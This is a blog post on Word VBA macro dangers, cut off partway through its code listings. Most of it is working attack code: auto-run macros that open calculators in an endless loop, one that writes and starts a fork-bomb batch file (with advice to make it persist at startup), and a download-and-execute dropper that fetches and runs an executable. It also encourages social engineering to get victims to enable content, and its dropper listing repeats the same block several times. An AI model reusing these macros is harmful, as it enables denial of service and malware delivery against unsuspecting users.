---
Dangers of .doc &#8211; MS Word Documents
---
<article class="post-listing post-16932 post type-post status-publish format-standard has-post-thumbnail hentry  tag-dangers tag-doc tag-documents tag-ms tag-word">
    <div class="post-inner">
        <span>Posted by: <a href="https://www.deepdotweb.com/author/filipjelic/" title="">Filip Jelic </a></span>
    <span>December 15, 2016</span>
    
    <span><a href="https://www.deepdotweb.com/2016/12/15/dangers-doc-ms-word-documents/#comments">1 Comment</a></span>
    </p>
    <div class="clear"></div>
    <div class="entry">
    <p>Microsoft Office Word documents have &#8220;macro&#8221; functionality which is implemented in Visual Basic for Applications (VBA) programming language. VBA is nearly the same as Visual Basic, main difference is that VB compiles to an executable and VBA needs a document as a carrier.</p>
    <p>In my previous article, I analyzed .svg images for spreading malware. SVG images used embedded JavaScript which runs in a browser which poses some restrictions. VBA on the other hand runs as an executable, thus has more permissions.</p>
    <p>Some social engineering is needed for victim to click &#8216;Enable Content&#8217;, but I don&#8217;t think that&#8217;s difficult. That button loads and starts the scripts. <strong>Clicking &#8216;enable content&#8217; is enough for malware to get installed. </strong>Very often social engineering trick is to use Microsoft&#8217;s generic option: Enable macros to view content.</p>
    <p>Visual Basic is powerful programming language, I&#8217;ve seen Remote Administrator Tools written in Visual Basic. However, adding such malware to a document would greatly increase its size. Also, detaching from a document carrier is preferable because of some restrictions. Therefore, downloaders are more suitable to hackers. Additionally, changing the payload is also possible because it&#8217;s done on the server side.</p>
    <p><img class="wp-image-16941 aligncenter" src="/imgs/2016/12/word-image-53.png" srcset="/imgs/2016/12/word-image-53.png 465w, /imgs/2016/12/word-image-53-300x77.png 300w" sizes="(max-width: 465px) 100vw, 465px"/></p>
    <p><strong>Simple pranks for demonstration</strong></p>
    <p>This is how you view and record macros: open a document -&gt; View -&gt; Macros.</p>
    <p><img class="wp-image-16942 aligncenter" src="/imgs/2016/12/word-image-54.png" srcset="/imgs/2016/12/word-image-54.png 1204w, /imgs/2016/12/word-image-54-300x32.png 300w, /imgs/2016/12/word-image-54-1024x108.png 1024w" sizes="(max-width: 1204px) 100vw, 1204px"/> <img class="wp-image-16943 aligncenter" src="/imgs/2016/12/word-image-55.png" srcset="/imgs/2016/12/word-image-55.png 1204w, /imgs/2016/12/word-image-55-300x36.png 300w, /imgs/2016/12/word-image-55-1024x123.png 1024w" sizes="(max-width: 1204px) 100vw, 1204px"/></p>
    <p>If we choose to record Macro, we have the option to assign macro to Button or Keyboard.</p>
    <p><img class="wp-image-16944 aligncenter" src="/imgs/2016/12/word-image-56.png" srcset="/imgs/2016/12/word-image-56.png 333w, /imgs/2016/12/word-image-56-300x206.png 300w" sizes="(max-width: 333px) 100vw, 333px"/></p>
    <p>But we&#8217;re going to choose AutoOpen() option so we don&#8217;t need that – our script can execute as soon as macro is enabled. For example, this script opens a calculator upon opening the document. It will ask for permission (Enable Content) only first time it executes:</p>
    <div id="crayon-5963870fc2d41383119740" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    Sub AutoOpen()
    
    Shell ("C:\Windows\system32\calc.exe")
    
    End Sub</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5963870fc2d41383119740-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d41383119740-2">2</div><div class="crayon-num" data-line="crayon-5963870fc2d41383119740-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d41383119740-4">4</div><div class="crayon-num" data-line="crayon-5963870fc2d41383119740-5">5</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5963870fc2d41383119740-1"><span class="crayon-e">Sub </span><span class="crayon-e">AutoOpen</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d41383119740-2">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d41383119740-3"><span class="crayon-e">Shell</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"C:\Windows\system32\calc.exe"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d41383119740-4">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d41383119740-5"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-v">Sub</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    
    <p>
    We can add an infinite loop to make the script constantly keep opening new calculators to clog o:</p>
    <div id="crayon-5963870fc2d4a452356786" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    Sub AutoOpen()
    
    Do While true
    
    Shell("C:\Windows\system32\calc.exe")
    
    Loop
    
    End Sub</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5963870fc2d4a452356786-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d4a452356786-2">2</div><div class="crayon-num" data-line="crayon-5963870fc2d4a452356786-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d4a452356786-4">4</div><div class="crayon-num" data-line="crayon-5963870fc2d4a452356786-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d4a452356786-6">6</div><div class="crayon-num" data-line="crayon-5963870fc2d4a452356786-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d4a452356786-8">8</div><div class="crayon-num" data-line="crayon-5963870fc2d4a452356786-9">9</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5963870fc2d4a452356786-1"><span class="crayon-e">Sub </span><span class="crayon-e">AutoOpen</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d4a452356786-2">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d4a452356786-3"><span class="crayon-st">Do</span><span class="crayon-h"> </span><span class="crayon-st">While</span><span class="crayon-h"> </span><span class="crayon-t">true</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d4a452356786-4">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d4a452356786-5"><span class="crayon-e">Shell</span><span class="crayon-sy">(</span><span class="crayon-s">"C:\Windows\system32\calc.exe"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d4a452356786-6">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d4a452356786-7"><span class="crayon-e">Loop</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d4a452356786-8">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d4a452356786-9"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-v">Sub</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    
    <p>
    It will stop when the document is closed, but we can detach from the document. This script creates and starts a forkbomb.bat &#8211; Windows bash script that executes some terminal commands. Forkbomb.bat starts 2 copies of itself. Both of those do the same thing, resulting in exponential growth which completely depletes computer resources:</p>
    <div id="crayon-5963870fc2d4e081356745" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    Sub AutoOpen()
    
    Shell("cmd.exe /S /K" &amp; "echo %0^|%0 &gt; forkbomb.bat")
    
    Shell("cmd.exe /S /K" &amp; "forkbomb.bat")
    
    End Sub</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5963870fc2d4e081356745-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d4e081356745-2">2</div><div class="crayon-num" data-line="crayon-5963870fc2d4e081356745-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d4e081356745-4">4</div><div class="crayon-num" data-line="crayon-5963870fc2d4e081356745-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d4e081356745-6">6</div><div class="crayon-num" data-line="crayon-5963870fc2d4e081356745-7">7</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5963870fc2d4e081356745-1"><span class="crayon-e">Sub </span><span class="crayon-e">AutoOpen</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d4e081356745-2">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d4e081356745-3"><span class="crayon-e">Shell</span><span class="crayon-sy">(</span><span class="crayon-s">"cmd.exe /S /K"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-s">"echo %0^|%0 &gt; forkbomb.bat"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d4e081356745-4">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d4e081356745-5"><span class="crayon-e">Shell</span><span class="crayon-sy">(</span><span class="crayon-s">"cmd.exe /S /K"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-s">"forkbomb.bat"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d4e081356745-6">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d4e081356745-7"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-v">Sub</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    
    <p>
    Causing unusable computer, force restart is necessary to kill it. Something like this is expected:</p>
    <p><img class="wp-image-16945 aligncenter" src="/imgs/2016/12/word-image-57.png" srcset="/imgs/2016/12/word-image-57.png 1154w, /imgs/2016/12/word-image-57-300x237.png 300w, /imgs/2016/12/word-image-57-1024x809.png 1024w" sizes="(max-width: 1154px) 100vw, 1154px"/></p>
    <p>You can extend the script to make it run when pc is started to clog his/her pc once again. Safe boot would be the solution then.</p>
    <p><strong>VBA download and execute file upon opening</strong></p>
    <p>Thanks to malmoe for his <a href="https://gist.github.com/malmoe/dbad6e9ccfd2efc39b34">share</a> – A short VBA macro to download and execute a file.</p>
    <div id="crayon-5963870fc2d53344166230" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    Sub AutoOpen()
    
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    
    xHttp.Open "GET", "http:///", False
    
    xHttp.Send
    
    With bStrm
    
    .Type = 1 '//binary
    
    .Open
    
    .write xHttp.responseBody
    
    .savetofile "file.exe", 2 '//overwrite
    
    End With
    
    Shell("cmd.exe /S /K" &amp; "file.exe")
    
    End Sub
    
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    
    xHttp.Open "GET", "http:///", False
    
    xHttp.Send
    
    With bStrm
    
    .Type = 1 '//binary
    
    .Open
    
    .write xHttp.responseBody
    
    .savetofile "file.exe", 2 '//overwrite
    
    End With
    
    Shell("cmd.exe /S /K" &amp; "file.exe")
    
    End Sub
    
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    
    xHttp.Open "GET", "http:///", False
    
    xHttp.Send
    
    With bStrm
    
    .Type = 1 '//binary
    
    .Open
    
    .write xHttp.responseBody
    
    .savetofile "file.exe", 2 '//overwrite
    
    End With
    
    Shell("cmd.exe /S /K" &amp; "file.exe")
    
    End Sub</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-2">2</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-4">4</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-6">6</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-8">8</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-10">10</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-12">12</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-14">14</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-16">16</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-18">18</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-20">20</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-22">22</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-24">24</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-26">26</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-28">28</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-30">30</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-32">32</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-34">34</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-36">36</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-38">38</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-40">40</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-42">42</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-44">44</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-46">46</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-48">48</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-50">50</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-52">52</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-54">54</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-56">56</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-58">58</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-60">60</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-62">62</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-64">64</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-66">66</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-68">68</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-70">70</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-5963870fc2d53344166230-72">72</div><div class="crayon-num" data-line="crayon-5963870fc2d53344166230-73">73</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5963870fc2d53344166230-1"><span class="crayon-e">Sub </span><span class="crayon-e">AutoOpen</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-2">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-3"><span class="crayon-e">Dim </span><span class="crayon-v">xHttp</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Set </span><span class="crayon-v">xHttp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"Microsoft.XMLHTTP"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-4">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-5"><span class="crayon-e">Dim </span><span class="crayon-v">bStrm</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Set </span><span class="crayon-v">bStrm</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"Adodb.Stream"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-6">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-7"><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-i">Open</span><span class="crayon-h"> </span><span class="crayon-s">"GET"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"http:///"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">False</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-8">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-9"><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-e">Send</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-10">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-11"><span class="crayon-e">With </span><span class="crayon-i">bStrm</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-12">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-13"><span class="crayon-sy">.</span><span class="crayon-v">Type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-s">'//binary</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-14">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-15"><span class="crayon-s">.Open</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-16">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-17"><span class="crayon-s">.write xHttp.responseBody</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-18">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-19"><span class="crayon-s">.savetofile "file.exe", 2 '</span><span class="crayon-c">//overwrite</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-20">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-21"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-e">With</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-22">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-23"><span class="crayon-e">Shell</span><span class="crayon-sy">(</span><span class="crayon-s">"cmd.exe /S /K"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-s">"file.exe"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-24">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-25"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-e">Sub</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-26">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-27"><span class="crayon-e">Dim </span><span class="crayon-v">xHttp</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Set </span><span class="crayon-v">xHttp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"Microsoft.XMLHTTP"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-28">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-29"><span class="crayon-e">Dim </span><span class="crayon-v">bStrm</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Set </span><span class="crayon-v">bStrm</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"Adodb.Stream"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-30">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-31"><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-i">Open</span><span class="crayon-h"> </span><span class="crayon-s">"GET"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"http:///"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">False</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-32">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-33"><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-e">Send</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-34">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-35"><span class="crayon-e">With </span><span class="crayon-i">bStrm</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-36">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-37"><span class="crayon-sy">.</span><span class="crayon-v">Type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-s">'//binary</span></div><div class="crayon-line crayon-striped-line" 